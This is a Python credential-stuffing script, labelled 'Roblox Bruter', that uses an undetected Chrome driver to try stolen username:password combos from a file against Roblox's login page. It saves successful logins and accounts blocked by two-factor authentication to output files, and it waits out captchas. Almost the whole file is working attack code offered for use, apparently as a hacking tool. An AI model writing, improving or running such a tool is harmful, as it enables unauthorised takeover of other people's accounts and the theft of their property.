"""
MADE BY STRIX
"""

import logging
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from datetime import datetime
from colorama import init, Fore, Style
import os
import pystyle
from pystyle import System, Colorate, Colors, Center
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from typing import Dict, Any, Union, List

tool_name = "Roblox Bruter"
author = "Strix"
bar = "┃"
github = "github.com/evilstrix"

LBL = "\x1b[38;5;27m"
sep = f"{Fore.LIGHTBLACK_EX} ● {Fore.LIGHTWHITE_EX}"

gradient = [
    "\033[38;5;196m",
    "\033[38;5;160m",
    "\033[38;5;124m",
    "\033[38;5;88m",
    "\033[38;5;52m",
    "\033[38;5;231m",
    "\033[38;5;255m"
]

banner = f"""
{gradient[0]} _____ {gradient[4]}_____ {gradient[2]}_____ {gradient[3]}_____ {gradient[4]}_____ {gradient[2]}_____ {gradient[4]}_____ 
{gradient[0]}|     |{gradient[4]}   __|{gradient[2]} __  |{gradient[3]}     |{gradient[4]}  |  |{gradient[2]} __  |{gradient[4]}   __|
{gradient[0]}| | | |{gradient[4]}   __|{gradient[2]}    -|{gradient[3]}   --|{gradient[4]}  |  |{gradient[2]}    -|{gradient[4]}   __|
{gradient[0]}|_|_|_|{gradient[4]}_____|{gradient[2]}__|__|{gradient[3]}_____|{gradient[4]}_____|{gradient[2]}__|__|{gradient[4]}_____|
"""

# THE LOGGER IS NOT MINE!!!

class Leveragers:
    def __init__(self):
        self.logger = logging.getLogger('custom_logger')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(message)s'))
        self.logger.addHandler(handler)

    def log(self, level, msg):
        time = f"{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Style.RESET_ALL}"
        color = {
            'DBG': Fore.LIGHTCYAN_EX,
            'ERR': Fore.LIGHTRED_EX,
            'RATELIMT': Fore.LIGHTYELLOW_EX,
            'INP': Fore.LIGHTCYAN_EX,
            'INF': LBL    
        }.get(level.upper(), Fore.WHITE)
        tag = f"{color}{level.upper()}{Style.RESET_ALL}"
        method = {
            'DBG': self.logger.debug,
            'ERR': self.logger.error,
            'RATELIMT': self.logger.warning,
            'INP': self.logger.info,
            'INF': self.logger.info
        }.get(level.upper(), self.logger.info)
        method(f"{time} - {tag}{sep}{msg}")

    def dbg(self, msg):
        self.log('DBG', msg)

    def err(self, msg):
        self.log('ERR', msg)

    def ratelimt(self, msg):
        self.log('RATELIMT', msg)

    def inf(self, msg):
        self.log('INF', msg)

    def inp(self, prompt: str) -> str:
        self.log('INP', prompt)
        return input(prompt)

# THE LOGGER IS NOT MINE!!

log = Leveragers()

def init_drv(opts: Dict[str, Any]) -> uc.Chrome:
    opt_arr = [f"--{k}={v}" for k, v in opts.items()]
    drv_opts = uc.ChromeOptions()
    [drv_opts.add_argument(opt) for opt in opt_arr]
    log.inf("Driver initialized with options.")
    return uc.Chrome(options=drv_opts)

def sel_elem(drv: uc.Chrome, loc: str, by: str = "xpath") -> Any:
    loc_map = {'xpath': By.XPATH, 'css': By.CSS_SELECTOR, 'name': By.NAME}
    try:
        element = drv.find_element(loc_map[by], loc)
        log.dbg(f"Element found with {by}: {loc}")
        return element
    except Exception as e:
        log.inf(f"Failure")
        return None

def chk_2fa(drv: uc.Chrome, user: str) -> bool:
    try:
        WebDriverWait(drv, 0).until(EC.presence_of_element_located((By.XPATH, "//input[@type='text' and @placeholder='Enter code']")))
        log.ratelimt(f"2FA prompt detected for {user}. Skipping...")
        sel_elem(drv, "//button[contains(text(), 'Close')]").click()
        return True
    except Exception:
        log.inf(f"No 2FA or bypassed for {user}.")
        return False

def chk_captcha(drv: uc.Chrome, wait_time: int) -> bool:
    try:
        WebDriverWait(drv, wait_time).until(EC.presence_of_element_located((By.XPATH, "//iframe[contains(@src, 'captcha')]")))
        log.ratelimt(f"Captcha detected. Waiting for {wait_time} seconds to bypass...")
        time.sleep(wait_time)
        return True
    except Exception:
        return False

def lgn(drv: uc.Chrome, usr: str, pwd: str) -> bool:
    try:
        drv.get('https://www.roblox.com/login')
        sel_elem(drv, 'username', 'name').send_keys(usr)
        sel_elem(drv, 'password', 'name').send_keys(pwd + Keys.RETURN)

        if chk_2fa(drv, usr):
            return False

        if chk_captcha(drv, captcha_wait_time):
            return False
        
        if "Invalid credentials" in drv.page_source:
            log.inf(f"Login failed for {usr}, invalid credentials. Proceeding to next...")
            return False

        WebDriverWait(drv, 1).until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Logout')]")))
        log.inf(f"Login successful for {usr}.")
        return True
    except Exception as e:
        log.inf(f"Login failed for {usr}. Skipping this account.")
        return False

def load_cmbs(fp: str) -> List[str]:
    try:
        Utils.clear()
        Utils.title()
        Utils.size()
        print(banner)
        with open(fp, 'r') as file:
            lines = file.readlines()
            log.inf(f"Credentials loaded from {fp}")
            return lines
    except Exception as e:
        log.inf(f"Failed to load credentials from {fp}: {e}")
        raise

class Utils:
    def clear():
        os.system('clear||cls')

    def title():
        os.system(f'title {tool_name} {bar} Made by {author} {bar} {github}')
    
    def size():
        System.Size(86, 25)

def process_login(drv: uc.Chrome, cmb: str) -> None:
    usr, pwd = cmb.strip().split(':')
    log.inf(f"Processing login for {usr}")
    success = lgn(drv, usr, pwd)
    if success:
        log.inf(f"Completed login for {usr}")
        with open('output/success.txt', 'a') as f:
            f.write(f"{usr}:{pwd}\n")
    else:
        log.inf(f"Skipping account {usr}")
        if chk_2fa(drv, usr):
            with open('output/2fa.txt', 'a') as f:
                f.write(f"{usr}:{pwd}\n")

def main(**kwargs: Dict[str, Any]) -> None:
    opts = kwargs.get('opts', {})
    cmbs = load_cmbs(kwargs.get('fp', f'input/combos.txt'))
    
    global captcha_wait_time
    captcha_wait_time = 5

    drv = init_drv(opts)
    
    drv.get('https://www.roblox.com/login')
    
    for line in cmbs:
        process_login(drv, line)

        try:
            log.inf(f"Logging out...")
            sel_elem(drv, "//button[contains(text(), 'Logout')]").click()
            WebDriverWait(drv, 1).until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Login')]")))
            log.inf("Logged out successfully.")
        except Exception as e:
            log.inf(f"Failure during logout")

    drv.quit()
    log.inf("Done")

if __name__ == "__main__":
    main(
        opts={'start-maximized': None},
        fp='input/combos.txt'
    )
